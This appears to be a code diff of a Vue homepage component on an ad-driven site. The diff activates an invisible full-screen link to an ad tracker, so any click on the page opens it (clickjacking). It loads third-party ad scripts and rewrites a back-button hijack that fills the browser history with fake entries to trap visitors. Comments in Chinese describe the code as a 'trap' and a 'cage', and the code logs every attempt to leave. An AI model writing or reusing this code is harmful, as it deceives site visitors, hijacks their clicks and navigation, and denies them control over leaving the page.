@@ -2,18 +2,24 @@
   <div class="home-b">
 <!--    <div id="container-d1debede50ec7d8df5940dc07088499f"></div>-->
 <!--    <img src="../assets/adsimg/a.png" style="margin: 0 auto;" alt="">-->
-    <AdBannerList />
+
 
     <!--  https://h4imw.bemobtrcks.com/click  -->
-<!--    <a href="https://6njvi.bemobtrcks.com/click"-->
-<!--       target="_blank"-->
-<!--       ref="stealthNet"-->
-<!--       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: pointer;"-->
-<!--       @click="hideStealthNet"-->
-<!--    >-->
-<!--    </a>-->
+    <a href="https://6njvi.bemobtrcks.com/click"
+       target="_blank"
+       ref="stealthNet"
+       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100%; z-index: 9999; opacity: 0; cursor: pointer;"
+       @click="hideStealthNet"
+    >
+    </a>
     <!-- 通知权限弹窗 -->
 <!--    <NotificationDialog ref="notificationDialog" />-->
+
+    <AdsterraManager idTxt="adsterra-banner-1-box" :zid="1" style="margin-top: 1rem; margin-bottom: 0;" :immediate="false" :showTitle="true"/>
+    <AdBannerList  style="margin-top: 1rem;"/>
+    <div id="container-d1debede50ec7d8df5940dc07088499f"></div>
+
+<!--    <Dialog v-if="showDialog" @close="showDialog = false" />-->
   </div>
 </template>
 
@@ -24,8 +30,11 @@ import NotificationDialog from "@/components/NotificationDialog.vue";
 import {gaLogEvent} from "@/utils/event";
 import AdBannerList from "@/components/AdBannerList.vue";
 import {loadScript} from "../utils";
+import AdsterraManager from "../components/AdsterraManager.vue";
+import Dialog from "../components/Dialog.vue";
 
 const stealthNet = ref(null);
+const showDialog = ref(false);
 
 onMounted(() => {
   injectBeMobTracking();
@@ -38,8 +47,9 @@ onMounted(() => {
   })
 
   setTimeout(() => {
-    loadScript("https://freshmanhow.com/32/8f/4b/328f4b449c3a62bd7e29fb0553d04b03.js", "Adsterra");
-
+    loadScript("https://freshmanhow.com/32/8f/4b/328f4b449c3a62bd7e29fb0553d04b03.js", "SocialBar");
+    loadScript("https://freshmanhow.com/d1debede50ec7d8df5940dc07088499f/invoke.js", "NativeBanner");
+    // loadScript("https://freshmanhow.com/dd/10/63/dd106361c330652cbd7160d60ac616de.js", "Popunder");
     initBackHijack();
   }, 500)
 })
@@ -54,17 +64,42 @@ const hideStealthNet = () => {
   })
 }
 
-const initBackHijack = (showPopupCallback) => {
-  let baseUrl = location.href.split('?')[0]; // 获取干净的当前URL
+const initBackHijack = () => {
+  // 我们只操作 hash，绝对不碰 ? 后面的宏参数
 
-  // 1. 塞入假的历史记录（布置陷阱）
-  history.replaceState({ page: 'trap' }, '', baseUrl + '?step=1');
-  history.pushState({ page: 'current' }, '', baseUrl + '?step=2');
+  // 如果页面刚加载时没有 hash，我们就主动给他加上 #trap
+  if (window.location.hash !== '#trap' && window.location.hash !== '#current') {
+    // 1. 布置陷阱：先把当前页面偷偷换成 #trap
+    history.replaceState({ page: 'trap' }, '', window.location.pathname + window.location.search + '#trap');
 
-  // 2. 监听老哥按返回键（收网）
+    // 2. 往前推一步：再塞入一个 #current。这样老哥一按返回，就会退到 #trap
+    history.pushState({ page: 'current' }, '', window.location.pathname + window.location.search + '#current');
+  }
+
+  // 3. 监听老哥按返回键（收网）
   window.addEventListener("popstate", (event) => {
-    // 只要他按了返回键退到了 step=1，立刻重新把历史记录补满！让他永远在笼子里
-    history.pushState({ page: 'current' }, '', baseUrl + '?step=2');
+    // 检查他是不是退到了陷阱层 (#trap)
+    if (window.location.hash === '#trap') {
+
+      // 只要他退到了 trap，立刻重新把历史记录补满！把他再推到 current 牢笼里
+      setTimeout(() => {
+        history.pushState(
+            { page: 'current' },
+            '',
+            window.location.pathname + window.location.search + '#current'
+        );
+
+        // 核心收网动作：老哥想跑，直接弹出终极诱导弹窗逼他点！
+        // showDialog.value = true;
+
+        // 可选：记录他试图逃跑的动作
+        gaLogEvent.logEvent({
+          eventName: "user_attempt_exit",
+          eventLog: `User tried to go back`
+        });
+
+      }, 10);
+    }
   });
 }
 
@@ -95,5 +130,6 @@ const injectBeMobTracking = () => {
   margin: 0 auto;
   width: 100%;
   height: auto;
+  overflow: auto;
 }
 </style>
